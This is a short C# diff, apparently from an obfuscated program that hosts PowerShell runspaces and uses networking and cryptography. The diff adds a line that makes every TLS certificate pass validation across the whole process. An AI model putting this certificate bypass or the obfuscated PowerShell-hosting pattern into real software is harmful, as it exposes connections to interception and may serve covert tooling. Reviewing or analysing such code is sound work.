@@ -9,6 +9,7 @@ using System.Management.Automation;
 using System.Collections.ObjectModel;
 using System.Management.Automation.Runspaces;
 using System.Net;
+using System.Net.Security;
 using System.Diagnostics;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
@@ -407,6 +408,7 @@ namespace VAR1
 
         public static void VAR13(string VAR14, string VAR15, string VAR16)
         {
+            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
             VAR7 = VAR14;
             VAR8 = VAR37(16);
             VAR9 = Encoding.ASCII.GetBytes(VAR15);
